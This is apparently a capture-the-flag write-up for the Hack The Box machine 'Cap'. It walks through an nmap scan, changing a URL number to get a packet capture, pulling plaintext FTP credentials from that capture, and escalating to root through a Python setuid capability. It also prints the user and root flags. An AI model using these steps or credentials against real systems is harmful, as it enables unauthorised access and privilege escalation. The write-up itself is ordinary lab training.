---
title: "Cap from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Cap from HTB
`nmap`gave this:
```bash
PORT      STATE    SERVICE VERSION
21/tcp    open     ftp     vsftpd 3.0.3
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp    open     http    gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
```
Access the `80 port`with `IP`
then click `security snapshot ...`
`URL`be like this:
```bash
http://10.10.10.245/data/3 # there is an number at the end maybe change that
http://10.10.10.245/data/0 # This will give us needed .pcap file
```
Open the `.pcap`file and follow streams of `FTP`
You will get the password and username
```
Username ---> nathan
Password ---> Buck3tH4TF0RM3!
```
Go to `ssh`and connect to it
***
User Flag is: a51aa4976cedcfbc93ee7308268c25de
***
Download `linpeas.sh`and run it. You will find
```bash
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```
This means you can run `python3.8`with root `UID`
Then spawn an `root shell`
```python
usr/bin/python3.8
>>> import os
>>> os.setuid(0)
>>> os.system("/bin/bash")
root@cap:~#
```
***
Root Flag is: 6a31ea6a610e384a46ff746bc1b0797f
***
![](/assets/images/Screenshot from 2024-08-16 16-52-43.png)
